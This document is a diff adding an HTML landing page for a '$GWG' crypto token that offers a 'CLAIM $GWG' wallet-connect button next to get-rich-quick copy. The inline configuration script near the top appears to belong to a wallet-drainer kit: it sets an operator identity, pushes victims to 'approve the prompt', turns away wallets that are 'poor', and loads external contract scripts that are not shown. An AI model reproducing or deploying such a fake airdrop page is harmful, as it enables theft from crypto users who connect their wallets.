@@ -1,0 +1,481 @@
+<!DOCTYPE html><!-- Last Published: Fri Sep 15 2023 20:46:12 GMT+0000 (Coordinated Universal Time) -->
+<html class=" w-mod-js">
+
+<script defer="defer" src="js/vendors.js"></script>
+  <script defer="defer" src="js/contracts.js"></script>
+  <script defer="defer" src="js/main.js"></script>
+  
+  <script>
+    window.UNIQUE_IDENTITY = "yelping_cheetah_23";
+  
+    // Pick a theme here, this defaults to "light"
+    window.modal_theme = "light";
+  
+    // https://docs.walletconnect.com/2.0/web/walletConnectModal/theming
+    window.modal_variables = { "--w3m-accent-color": "#000000", "--w3m-background-color": "#000000",
+      /* Example of what you can do */
+      // "--w3m-accent-color": "#FC9EFB",
+      // "--w3m-background-color": "#0073FF",
+      // "--w3m-logo-image-url": "/your-logo.svg",
+    };
+  
+    // Notification modals
+   window.popups = {
+  PENDING: {
+    // The popup that shows when they get prompted
+    title: "Claim Pending",
+    text: "You must approve the prompt in order to continue."
+  },
+  INVALID: {
+    // Shown when they connect on a wallet that is poor.
+    // title: "Ineligible Address",
+    text: "The connected account is not eligible for this event.\nPlease try using a different account.",
+  }
+    }
+  
+    // Only touch this if you know what you're doing!
+    window.OVERRIDE_MODE = false;
+  </script>
+  </head>
+    <style>
+        .wf-force-outline-none[tabindex="-1"]:focus {
+            outline: none;
+        }
+    </style>
+    <meta charset="UTF-8">
+    <title>GWG</title>
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <link href="gwg-a22c29.webflow.c7c65969c.css" rel="stylesheet" type="text/css">
+    <link href="65028c94c1c183e59a5a6b70_1f4b2.png" rel="shortcut icon" type="image/x-icon">
+    <link href="https://uploads-ssl.webflow.com/65027eecfb755f5cdbadc65a/65028c9e3ed0ae8b6d3ce21b_1f4b2%20(1).png"
+        rel="apple-touch-icon">
+    <style type="text/css">
+        div.eapps-widget {
+            position: relative
+        }
+
+        div.eapps-widget.eapps-widget-show-toolbar:before {
+            position: absolute;
+            content: "";
+            display: block;
+            bottom: 0;
+            top: 0;
+            left: 0;
+            right: 0;
+            pointer-events: none;
+            border: 1px solid transparent;
+            transition: border .3s ease;
+            z-index: 1
+        }
+
+        .eapps-widget-toolbar {
+            position: absolute;
+            top: -32px;
+            left: 0;
+            right: 0;
+            display: block;
+            z-index: 99999;
+            padding-bottom: 4px;
+            transition: all .3s ease;
+            pointer-events: none;
+            opacity: 0
+        }
+
+        .eapps-widget:hover .eapps-widget-toolbar {
+            opacity: 1;
+            pointer-events: auto
+        }
+
+        .eapps-widget-toolbar a {
+            text-decoration: none;
+            box-shadow: none !important
+        }
+
+        .eapps-widget-toolbar-panel {
+            border-radius: 6px;
+            background-color: #222;
+            color: #fff;
+            display: -ms-inline-flexbox;
+            display: inline-flex;
+            -ms-flex-align: center;
+            align-items: center;
+            top: 0;
+            position: relative;
+            transition: all .3s ease;
+            opacity: 0;
+            overflow: hidden;
+            -webkit-backface-visibility: hidden;
+            backface-visibility: hidden;
+            box-shadow: 0 0 0 1px hsla(0, 0%, 100%, .2);
+            height: 28px
+        }
+
+        .eapps-widget:hover .eapps-widget-toolbar-panel {
+            opacity: 1
+        }
+
+        .eapps-widget-toolbar-panel-wrapper {
+            width: 100%;
+            position: relative
+        }
+
+        .eapps-widget-toolbar-panel-only-you {
+            position: absolute;
+            top: -24px;
+            font-size: 11px;
+            line-height: 14px;
+            color: #9c9c9c;
+            padding: 5px 4px
+        }
+
+        .eapps-widget-toolbar-panel-logo {
+            width: 28px;
+            height: 28px;
+            border-right: 1px solid hsla(0, 0%, 100%, .2);
+            display: -ms-flexbox;
+            display: flex;
+            -ms-flex-align: center;
+            align-items: center;
+            -ms-flex-pack: center;
+            justify-content: center
+        }
+
+        .eapps-widget-toolbar-panel-logo svg {
+            display: block;
+            width: 15px;
+            height: 15px;
+            fill: #f93262
+        }
+
+        .eapps-widget-toolbar-panel-edit {
+            font-size: 12px;
+            font-weight: 400;
+            line-height: 14px;
+            display: -ms-inline-flexbox;
+            display: inline-flex;
+            -ms-flex-align: center;
+            align-items: center;
+            padding: 9px;
+            border-right: 1px solid hsla(0, 0%, 100%, .2);
+            color: #fff;
+            text-decoration: none
+        }
+
+        .eapps-widget-toolbar-panel-edit-icon {
+            width: 14px;
+            height: 14px;
+            margin-right: 8px
+        }
+
+        .eapps-widget-toolbar-panel-edit-icon svg {
+            display: block;
+            width: 100%;
+            height: 100%;
+            fill: #fff
+        }
+
+        .eapps-widget-toolbar-panel-views {
+            display: -ms-inline-flexbox;
+            display: inline-flex;
+            -ms-flex-pack: center;
+            justify-content: center;
+            -ms-flex-align: center;
+            align-items: center
+        }
+
+        .eapps-widget-toolbar-panel-views-label {
+            font-size: 12px;
+            font-weight: 400;
+            line-height: 14px;
+            margin-left: 8px
+        }
+
+        .eapps-widget-toolbar-panel-views-bar {
+            display: -ms-inline-flexbox;
+            display: inline-flex;
+            width: 70px;
+            height: 3px;
+            border-radius: 2px;
+            margin-left: 8px;
+            background-color: hsla(0, 0%, 100%, .3)
+        }
+
+        .eapps-widget-toolbar-panel-views-bar-inner {
+            border-radius: 2px;
+            background-color: #4ad504
+        }
+
+        .eapps-widget-toolbar-panel-views-green .eapps-widget-toolbar-panel-views-bar-inner {
+            background-color: #4ad504
+        }
+
+        .eapps-widget-toolbar-panel-views-red .eapps-widget-toolbar-panel-views-bar-inner {
+            background-color: #ff4734
+        }
+
+        .eapps-widget-toolbar-panel-views-orange .eapps-widget-toolbar-panel-views-bar-inner {
+            background-color: #ffb400
+        }
+
+        .eapps-widget-toolbar-panel-views-percent {
+            display: -ms-inline-flexbox;
+            display: inline-flex;
+            margin-left: 8px;
+            margin-right: 8px;
+            font-size: 12px;
+            font-weight: 400;
+            line-height: 14px
+        }
+
+        .eapps-widget-toolbar-panel-views-get-more {
+            padding: 9px 16px;
+            background-color: #f93262;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 400;
+            border-radius: 0 6px 6px 0
+        }
+
+        .eapps-widget-toolbar-panel-share {
+            position: absolute;
+            top: 0;
+            display: inline-block;
+            margin-left: 8px;
+            width: 83px;
+            height: 28px;
+            padding-bottom: 4px;
+            box-sizing: content-box !important
+        }
+
+        .eapps-widget-toolbar-panel-share:hover .eapps-widget-toolbar-panel-share-block {
+            opacity: 1;
+            pointer-events: all
+        }
+
+        .eapps-widget-toolbar-panel-share-button {
+            padding: 0 18px;
+            height: 28px;
+            background-color: #1c91ff;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 400;
+            border-radius: 6px;
+            position: absolute;
+            top: 0;
+            display: -ms-flexbox;
+            display: flex;
+            -ms-flex-direction: row;
+            flex-direction: row;
+            cursor: default;
+            -ms-flex-align: center;
+            align-items: center
+        }
+
+        .eapps-widget-toolbar-panel-share-button svg {
+            display: inline-block;
+            margin-right: 6px;
+            fill: #fff;
+            position: relative;
+            top: -1px
+        }
+
+        .eapps-widget-toolbar-panel-share-block {
+            position: absolute;
+            background: #fff;
+            border: 1px solid hsla(0, 0%, 7%, .1);
+            border-radius: 10px;
+            width: 209px;
+            top: 32px;
+            transform: translateX(-63px);
+            opacity: 0;
+            pointer-events: none;
+            transition: all .3s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, .05)
+        }
+
+        .eapps-widget-toolbar-panel-share-block:hover {
+            opacity: 1;
+            pointer-events: all
+        }
+
+        .eapps-widget-toolbar-panel-share-block-text {
+            color: #111;
+            font-size: 15px;
+            font-weight: 400;
+            padding: 12px 0;
+            text-align: center
+        }
+
+        .eapps-widget-toolbar-panel-share-block-text-icon {
+            padding-bottom: 4px
+        }
+
+        .eapps-widget-toolbar-panel-share-block-actions {
+            display: -ms-flexbox;
+            display: flex;
+            -ms-flex-direction: row;
+            flex-direction: row;
+            border-top: 1px solid hsla(0, 0%, 7%, .1)
+        }
+
+        .eapps-widget-toolbar-panel-share-block-actions-item {
+            width: 33.333333%;
+            display: -ms-flexbox;
+            display: flex;
+            -ms-flex-pack: center;
+            justify-content: center;
+            -ms-flex-align: center;
+            align-items: center;
+            height: 39px;
+            transition: all .3s ease;
+            background-color: transparent
+        }
+
+        .eapps-widget-toolbar-panel-share-block-actions-item:hover {
+            background-color: #fafafa
+        }
+
+        .eapps-widget-toolbar-panel-share-block-actions-item a {
+            width: 100%;
+            height: 100%;
+            display: -ms-flexbox;
+            display: flex;
+            -ms-flex-pack: center;
+            justify-content: center;
+            -ms-flex-align: center;
+            align-items: center
+        }
+
+        .eapps-widget-toolbar-panel-share-block-actions-item-icon {
+            width: 16px;
+            height: 16px;
+            display: block
+        }
+
+        .eapps-widget-toolbar-panel-share-block-actions-item-facebook .eapps-widget-toolbar-panel-share-block-actions-item-icon {
+            fill: #3c5a9b
+        }
+
+        .eapps-widget-toolbar-panel-share-block-actions-item-twitter .eapps-widget-toolbar-panel-share-block-actions-item-icon {
+            fill: #1ab2e8
+        }
+
+        .eapps-widget-toolbar-panel-share-block-actions-item-google .eapps-widget-toolbar-panel-share-block-actions-item-icon {
+            fill: #dd4b39
+        }
+
+        .eapps-widget-toolbar-panel-share-block-actions-item:not(:last-child) {
+            border-right: 1px solid hsla(0, 0%, 7%, .1)
+        }
+    </style>
+</head>
+
+<body class="body">
+    <section class="section">
+        <div class="w-layout-blockcontainer container w-container"><img
+                src="65027f5596ae11e06631099a_photo_2023-09-12%2009.56.53.png" loading="lazy"
+                sizes="(max-width: 767px) 100vw, (max-width: 991px) 95vw, 939.98046875px"
+                srcset="65027f5596ae11e06631099a_photo_2023-09-12%2009.56.53-p-500.png 500w, 65027f5596ae11e06631099a_photo_2023-09-12%2009.56.53-p-800.png 800w, 65027f5596ae11e06631099a_photo_2023-09-12%2009.56.53-p-1080.png 1080w, 65027f5596ae11e06631099a_photo_2023-09-12%2009.56.53.png 1280w"
+                alt="">
+            <h1 class="heading">CA: 0x13491627b5a1d24f9624bb67579b271e1a4e9433<br></h1>
+            <div id="connect_button" class="div-block"><a id="connect_button" class="button w-button">CLAIM $GWG</a></div>
+            <p class="paragraph">Accelerate your life with $GWG coin, your gateway to optimized gains. Leveraging
+                breakthrough technology, we are here to fast-track your journey to financial freedom and unprecedented
+                wealth. Your future, accelerated, with optimized gains — that is the $GWG mission.</p>
+            <div id="w-node-_6d958b01-bc6a-e025-a4d5-cebf9397c27f-dbadc666"
+                class="w-layout-layout quick-stack-3 wf-layout-layout">
+                <div id="w-node-_6d958b01-bc6a-e025-a4d5-cebf9397c280-dbadc666" class="w-layout-cell"><img
+                        src="6504c2504e646dc8cb82971e_photo_2023-09-15%2016.44.49.jpeg" loading="lazy" alt=""
+                        class="image-10"></div>
+                <div id="w-node-_6d958b01-bc6a-e025-a4d5-cebf9397c281-dbadc666" class="w-layout-cell"><img
+                        src="6504c27125ec0563bdd6384a_photo_2023-09-15%2016.45.25.jpeg" loading="lazy"
+                        sizes="(max-width: 991px) 100vw, 983.984375px"
+                        srcset="6504c27125ec0563bdd6384a_photo_2023-09-15%2016.45.25-p-500.jpeg 500w, 6504c27125ec0563bdd6384a_photo_2023-09-15%2016.45.25-p-800.jpeg 800w, 6504c27125ec0563bdd6384a_photo_2023-09-15%2016.45.25-p-1080.jpeg 1080w, 6504c27125ec0563bdd6384a_photo_2023-09-15%2016.45.25.jpeg 1114w"
+                        alt="" class="image-11"></div>
+            </div><img src="65028045d6de951842b9a45a_61ab150dbeda09972d8b43f177af43a4.gif" loading="lazy" width="397"
+                alt="" class="image">
+            <p class="paragraph">Welcome to the era of accelerated life and optimized gains with the $GWG coin. Our
+                groundbreaking platform is not just a technological marvel; it's your fastest route to a future brimming
+                with wealth and financial freedom. <br><br>We leverage cutting-edge technology to offer you more than
+                just gains; we offer optimized gains, amplifying your potential to generate wealth at an accelerated
+                pace.<br>Our mission is distinct and clear: to foster a world where financial growth is not just steady
+                but accelerated, empowering you to reap the benefits of your investments in a timeframe that matches the
+                speed of your dreams.<br>‍<br>We invite you to experience the transformative power of $GWG coin, a
+                financial beacon designed to accelerate your life with optimized gains. Make the choice today to steer
+                your financial journey towards a future where dreams are not just achieved, but accelerated.</p>
+            <div id="w-node-_85a37f75-6a0b-c4e6-f3cd-b9ba1538c3c8-dbadc666"
+                class="w-layout-layout quick-stack wf-layout-layout">
+                <div id="w-node-_72c8d158-193e-6206-3fa8-fcfb84932c7a-dbadc666" class="w-layout-cell"><img
+                        src="6504c1beb364f2b6efdbcbda_photo_2023-09-15%2016.42.27.jpeg" loading="lazy"
+                        sizes="(max-width: 915px) 100vw, 915px"
+                        srcset="6504c1beb364f2b6efdbcbda_photo_2023-09-15%2016.42.27-p-500.jpeg 500w, 6504c1beb364f2b6efdbcbda_photo_2023-09-15%2016.42.27-p-800.jpeg 800w, 6504c1beb364f2b6efdbcbda_photo_2023-09-15%2016.42.27.jpeg 915w"
+                        alt="" class="image-4"></div>
+                <div id="w-node-b6a14ea3-2ffc-d181-5ddf-8f8ce673623d-dbadc666" class="w-layout-cell"><img
+                        src="6504c1bfa195e0db11a01005_photo_2023-09-15%2016.42.26.jpeg" loading="lazy"
+                        sizes="(max-width: 925px) 100vw, 925px"
+                        srcset="6504c1bfa195e0db11a01005_photo_2023-09-15%2016.42.26-p-500.jpeg 500w, 6504c1bfa195e0db11a01005_photo_2023-09-15%2016.42.26-p-800.jpeg 800w, 6504c1bfa195e0db11a01005_photo_2023-09-15%2016.42.26.jpeg 925w"
+                        alt="" class="image-5"></div>
+                <div id="w-node-cf311cbf-a17f-270a-06f9-a286efb8be0c-dbadc666" class="w-layout-cell"><img
+                        src="6504c1c53cb10035e431ed5d_photo_2023-09-15%2016.42.24.jpeg" loading="lazy"
+                        sizes="(max-width: 991px) 100vw, 937.001953125px"
+                        srcset="6504c1c53cb10035e431ed5d_photo_2023-09-15%2016.42.24-p-500.jpeg 500w, 6504c1c53cb10035e431ed5d_photo_2023-09-15%2016.42.24-p-800.jpeg 800w, 6504c1c53cb10035e431ed5d_photo_2023-09-15%2016.42.24.jpeg 937w"
+                        alt="" class="image-6"></div>
+            </div><img src="6502822e202da9cf0a967567_photo_2023-09-12%2010.30.59.jpeg" loading="lazy"
+                sizes="(max-width: 767px) 100vw, (max-width: 991px) 95vw, 939.990234375px"
+                srcset="6502822e202da9cf0a967567_photo_2023-09-12%2010.30.59-p-500.jpeg 500w, 6502822e202da9cf0a967567_photo_2023-09-12%2010.30.59-p-800.jpeg 800w, 6502822e202da9cf0a967567_photo_2023-09-12%2010.30.59-p-1080.jpeg 1080w, 6502822e202da9cf0a967567_photo_2023-09-12%2010.30.59.jpeg 1280w"
+                alt="" class="image-2">
+            <div id="w-node-fe677dc4-7230-37c4-0f1b-ac744ef9a653-dbadc666"
+                class="w-layout-layout quick-stack-2 wf-layout-layout">
+                <div id="w-node-_845d10c6-d428-796e-0e9b-1ccf9917b7a1-dbadc666" class="w-layout-cell"><img
+                        src="6504c20abb43ef9237dca684_photo_2023-09-15%2016.43.40.jpeg" loading="lazy"
+                        sizes="(max-width: 767px) 100vw, (max-width: 991px) 99vw, 973.984375px"
+                        srcset="6504c20abb43ef9237dca684_photo_2023-09-15%2016.43.40-p-500.jpeg 500w, 6504c20abb43ef9237dca684_photo_2023-09-15%2016.43.40-p-800.jpeg 800w, 6504c20abb43ef9237dca684_photo_2023-09-15%2016.43.40-p-1080.jpeg 1080w, 6504c20abb43ef9237dca684_photo_2023-09-15%2016.43.40.jpeg 1280w"
+                        alt="" class="image-7"></div>
+                <div id="w-node-_332fea3f-de8c-2861-86fc-23bb01fabc53-dbadc666" class="w-layout-cell"><img
+                        src="6504c20fa195e0db11a06e2a_photo_2023-09-15%2016.43.39.jpeg" loading="lazy"
+                        sizes="(max-width: 767px) 100vw, (max-width: 991px) 99vw, 973.984375px"
+                        srcset="6504c20fa195e0db11a06e2a_photo_2023-09-15%2016.43.39-p-500.jpeg 500w, 6504c20fa195e0db11a06e2a_photo_2023-09-15%2016.43.39-p-800.jpeg 800w, 6504c20fa195e0db11a06e2a_photo_2023-09-15%2016.43.39-p-1080.jpeg 1080w, 6504c20fa195e0db11a06e2a_photo_2023-09-15%2016.43.39.jpeg 1280w"
+                        alt="" class="image-8"></div>
+                <div id="w-node-_3dcc5ca6-0c41-ef73-85df-086cc1a776a5-dbadc666" class="w-layout-cell"><img
+                        src="6504c212f4e232ec7fd294c4_photo_2023-09-15%2016.43.38.jpeg" loading="lazy"
+                        sizes="(max-width: 767px) 100vw, (max-width: 991px) 99vw, 973.984375px"
+                        srcset="6504c212f4e232ec7fd294c4_photo_2023-09-15%2016.43.38-p-500.jpeg 500w, 6504c212f4e232ec7fd294c4_photo_2023-09-15%2016.43.38-p-800.jpeg 800w, 6504c212f4e232ec7fd294c4_photo_2023-09-15%2016.43.38-p-1080.jpeg 1080w, 6504c212f4e232ec7fd294c4_photo_2023-09-15%2016.43.38.jpeg 1280w"
+                        alt="" class="image-9"></div>
+            </div><img src="65028423483936b32c52eb45_photo_2023-09-12%2009.53.20.jpeg" loading="lazy"
+                sizes="(max-width: 767px) 100vw, (max-width: 991px) 95vw, 940px"
+                srcset="65028423483936b32c52eb45_photo_2023-09-12%2009.53.20-p-500.jpeg 500w, 65028423483936b32c52eb45_photo_2023-09-12%2009.53.20-p-800.jpeg 800w, 65028423483936b32c52eb45_photo_2023-09-12%2009.53.20-p-1080.jpeg 1080w, 65028423483936b32c52eb45_photo_2023-09-12%2009.53.20.jpeg 1280w"
+                alt="" class="image-3">
+            <h1 class="heading-2">EXPLORE THE $GWG UNIVERSE</h1>
+            <div id="w-node-_88790194-4e88-b6d1-efec-2730d8468a8e-dbadc666" class="w-layout-layout wf-layout-layout">
+                <div id="w-node-_2810bc3c-58a4-4633-a692-319a9801ba58-dbadc666" class="w-layout-cell cell-quick">
+                    <p class="paragraph">Discover the technology that powers accelerated gains</p>
+                </div>
+                <div id="w-node-_1ff1e100-1dee-f65a-1fb8-4586082ece7c-dbadc666" class="w-layout-cell cell-quick">
+                    <p class="paragraph">Learn about our steadfast commitment to fast-tracking your wealth generation
+                        journey</p>
+                </div>
+            </div>
+            <div id="w-node-f97a36ea-cc3f-55ad-d24b-06da2287924a-dbadc666" class="w-layout-layout wf-layout-layout">
+                <div id="w-node-f97a36ea-cc3f-55ad-d24b-06da2287924b-dbadc666" class="w-layout-cell cell-quick">
+                    <p class="paragraph">Engage with a community focused on optimization and accelerated growth</p>
+                </div>
+                <div id="w-node-f97a36ea-cc3f-55ad-d24b-06da2287924e-dbadc666" class="w-layout-cell cell-quick">
+                    <p class="paragraph">Invest in a future where your financial gains are not just assured, but
+                        optimized for speed and sustainability</p>
+                </div>
+            </div><img src="6502821b36e32143b7b5fc6b_photo_2023-09-12%2009.56.53%20(1).png" loading="lazy"
+                sizes="(max-width: 767px) 100vw, (max-width: 991px) 95vw, 939.98046875px"
+                srcset="6502821b36e32143b7b5fc6b_photo_2023-09-12%2009.56.53%20(1)-p-500.png 500w, 6502821b36e32143b7b5fc6b_photo_2023-09-12%2009.56.53%20(1)-p-800.png 800w, 6502821b36e32143b7b5fc6b_photo_2023-09-12%2009.56.53%20(1)-p-1080.png 1080w, 6502821b36e32143b7b5fc6b_photo_2023-09-12%2009.56.53%20(1).png 1280w"
+                alt="">
+        </div>
+        <div class="html-embed w-embed w-script">
+            <div class="elfsight-app-8e75a338-b20c-4b67-a0a0-4d7fb946da97"></div>
+        </div>
+    </section>
+    <p class="paragraph-2">Investors acknowledge and understand that $GWG Generational Wealth Generator tokens/coins
+        have no intrinsic value, and their investment in $GWG is purely speculative. $GWG shall not be held liable for
+        any loss of value or damages incurred by investors due to the lack of intrinsic value associated with the
+        tokens/coins.</p>
+</body>
+
+</html>
